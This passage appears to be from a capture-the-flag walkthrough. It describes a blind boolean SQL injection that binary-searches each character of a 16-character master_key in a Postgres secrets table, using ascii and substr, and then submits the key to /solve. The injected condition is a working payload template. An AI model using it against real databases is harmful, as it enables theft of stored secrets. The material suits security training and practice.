Point the condition at the secret, one character at a time. Postgres `substr` and
`ascii` let you compare a single character's code:

```
<condition> = (SELECT ascii(substr(master_key,POS,1)) FROM secrets ORDER BY id LIMIT 1) >= VAL
```

Binary-search `VAL` between 48 (`'0'`) and 102 (`'f'`) for each position `POS` of
the 16-character `master_key`: about six requests pin down each character. Assemble
the 16 hex characters, then claim the flag:

```
POST /solve   Content-Type: application/json
{"key":"<the 16-char master_key>"}
```

`tests/exploit.py` automates exactly this.
